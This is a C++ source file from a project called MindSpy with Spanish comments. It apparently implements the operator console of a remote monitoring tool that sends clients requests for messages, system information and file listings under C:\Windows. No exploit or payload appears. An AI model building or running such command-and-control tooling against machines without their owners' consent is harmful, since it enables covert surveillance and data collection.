/**
* @file CPanel.cpp
* @author Carlos D. Alvarez
* @date 10/12/2016
* @brief Implementa la clase CPanel
*/

#include "CPanel.h"

namespace MindSpy
{
	int CPanel::TipoComando(const char*c)
	{
		const int CANTIDAD_COMANDOS = 5; // Cantidad de comandos disponibles
		// Arreglo de comandos
		char ComandosInternos[CANTIDAD_COMANDOS][16] = { "ALIAS", "ENVIAR", "SYSINFO", "REGINFO", "FILEINFO" };
		// Recorremos el arreglo en búsqueda de un comando existente.
		for (int i = 0; i < CANTIDAD_COMANDOS; i++)
		{
			// Si coincide alguno, retornamos
			if (!strcmp(ComandosInternos[i], c))
				return i;
		}
		return -1;
	}

	void CPanel::Run()
	{
		stringstream str; // Almacena el comando entero para separarlo
		string Comando, Op1, Op2; // Guarda el comando en bruto (leido desde el stream)
		char Mensaje[4096];	// Guarda el comando leido desde el stream

		Servidor c; // Crear e iniciar el servidor
		int SizeOpcode;
		// Iniciar la escucha del servidor
		if (c.Listo()) c.IniciarEscucha();
		while (true) {
			ZeroMemory(Mensaje, sizeof(Mensaje)); // Limpiar la memoria del mensaje 
			cin.getline(Mensaje, 4096, '\n'); // Esperar por un comando del usuario 
			str.clear(); // Limpiar el stream de comandos 
			str << Mensaje; // Empujar la cadena de comandos en el stream 
			str >> Comando; // Sacar el comando 
			str >> Op1; // Sacar el primer operando 
			getline(str, Op2, '\n'); // El resto de la cadena es el segundo operando

			// Convertirlo a mayúsculas, se evita strupr
			for (unsigned int i = 0; i < Comando.length(); i++)
			{
				Comando[i] = toupper(Comando[i]);
			}

			// Analizar el comando, y dar una respuesta con base en él
			switch (TipoComando(Comando.c_str()))
			{
			case INTERNOS_CMDS::REQ_ALIAS:
				if (c.SetAlias(Op1.c_str(), Op2.c_str()))
				{
					wcout << L"Alias cambiado." << endl;
				}
				else
				{
					wcout << L"Alias no cambiado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_ENVIAR:
				if (c.EnviarComando((char*)Op1.c_str(), Op2.length(), CLNT_CMDS::MENSAJE, (BYTE*)Op2.c_str()))
				{
					wcout << L"Mensaje enviado." << endl;
				}
				else
				{
					wcout << L"Mensaje no enviado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_SYSINFO:
				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::SYSINFO, NULL))
					wcout << L"Solicitando información de sistema..." << endl;
				break;

			case INTERNOS_CMDS::REQ_FILEINFO: {
				// Crear una nueva estructura para el pedido y llenarla
				stFileInfoRequest stfir;
				wcsncpy(stfir.Filtro, L"*.*", 4);
				wcsncpy(stfir.Path, L"C:\\Windows", 11);
				stfir.Query = FILEINFO_QUERY::REQ_ONLY_ARCHIVE;
				// Luego se envia esa estructura al cliente para que responda
				if (c.EnviarComando((char*)Op1.c_str(), sizeof(stFileInfoRequest), CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
					wcout << L"Solicitando información de archivos..." << endl;
				break;
			}
											  
			default:
				cout << "Comando \"" << Comando << "\" no existente" << endl;
			}
		}
	}
}